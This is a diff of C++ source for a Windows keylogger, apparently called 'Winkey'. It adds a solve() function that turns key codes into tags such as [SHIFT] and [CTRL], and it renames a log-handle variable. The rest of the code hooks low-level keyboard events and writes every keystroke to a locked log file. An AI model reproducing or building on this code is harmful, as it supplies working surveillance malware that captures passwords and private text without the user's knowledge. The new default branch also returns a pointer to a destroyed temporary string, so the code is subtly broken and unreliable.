@@ -1,7 +1,7 @@
 #include "winkey.h"
 
 Winkey::Winkey() {
-	gLogHandle_ = CreateFileA(
+	gLogHandle = CreateFileA(
 		LOG_FILE,
 		GENERIC_WRITE,
 		0,
@@ -11,14 +11,14 @@ Winkey::Winkey() {
 		NULL
 	);
 
-	if (gLogHandle_ == INVALID_HANDLE_VALUE) {
+	if (gLogHandle == INVALID_HANDLE_VALUE) {
 		throw std::runtime_error(std::format("CreateFile failed ({})\n", GetLastError()));
 	}
 
 	OVERLAPPED overlap = {0};
 
 	if (!LockFileEx(
-		gLogHandle_,
+		gLogHandle,
 		LOCKFILE_EXCLUSIVE_LOCK | LOCKFILE_FAIL_IMMEDIATELY,
 		0,
 		1,
@@ -30,18 +30,18 @@ Winkey::Winkey() {
 }
 
 Winkey::~Winkey() {
-	if (gLogHandle_ == nullptr) {
+	if (gLogHandle == nullptr) {
 		return;
 	}
 
 	OVERLAPPED overlap = { 0 };
 
-	if (!UnlockFileEx(gLogHandle_, 0, 1, 0, &overlap)) {
+	if (!UnlockFileEx(gLogHandle, 0, 1, 0, &overlap)) {
 		std::cout << std::format("UnlockFileEx failed ({})\n", GetLastError());
 	}
-	CloseHandle(gLogHandle_);
+	CloseHandle(gLogHandle);
 
-	gLogHandle_ = nullptr;
+	gLogHandle = nullptr;
 }
 
 int Winkey::Hook() {
@@ -64,15 +64,38 @@ int Winkey::Hook() {
 */
 LRESULT CALLBACK Winkey::onKey(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (wParam == WM_KEYDOWN) {
-		PKBDLLHOOKSTRUCT vbd = (PKBDLLHOOKSTRUCT)lParam;
+		PKBDLLHOOKSTRUCT kbdEv = (PKBDLLHOOKSTRUCT)lParam;
 
+		const char* data = solve(kbdEv);
 		DWORD bytesWrote;
-		const std::string data = std::format("{:c}", vbd->vkCode);
-		WriteFile(gLogHandle_, data.c_str(), data.length(), &bytesWrote, NULL);
+		WriteFile(gLogHandle, data, std::strlen(data), &bytesWrote, NULL);
 	}
 
 	/* Forward to next hooks ... */
 	return CallNextHookEx(NULL, nCode, wParam, lParam);
+}
+
+const char*	Winkey::solve(PKBDLLHOOKSTRUCT kbdEv) {
+	switch (kbdEv->vkCode) {
+	case VK_ESCAPE:		return "[ESC]";
+	case VK_DELETE:		return "[DELETE]";
+	case VK_LEFT:		return "[LEFTARROW]";
+	case VK_UP:			return "[UPARROW]";
+	case VK_RIGHT:		return "[RIGHTARROW]";
+	case VK_DOWN:		return "[DOWNARROW]";
+	case VK_SPACE:		return " ";
+	case VK_TAB:		return "[TAB]";
+	case VK_CAPITAL:	return "[CAPSLOCK]";
+	case VK_SHIFT:
+	case VK_LSHIFT:
+	case VK_RSHIFT:		return "[SHIFT]";
+	case VK_CONTROL:
+	case VK_LCONTROL:
+	case VK_RCONTROL:	return "[CTRL]";
+	case VK_RETURN:		return "\n";
+	default:
+		return std::format("{:c}", kbdEv->vkCode).c_str();
+	}
 }
 
 int __cdecl _tmain(int argc, TCHAR* argv[])
@@ -82,7 +105,7 @@ int __cdecl _tmain(int argc, TCHAR* argv[])
 		return 1;
 	}
 
-	gLogHandle_ = nullptr;
+	gLogHandle = nullptr;
 
 	try {
 		auto winkey = Winkey();
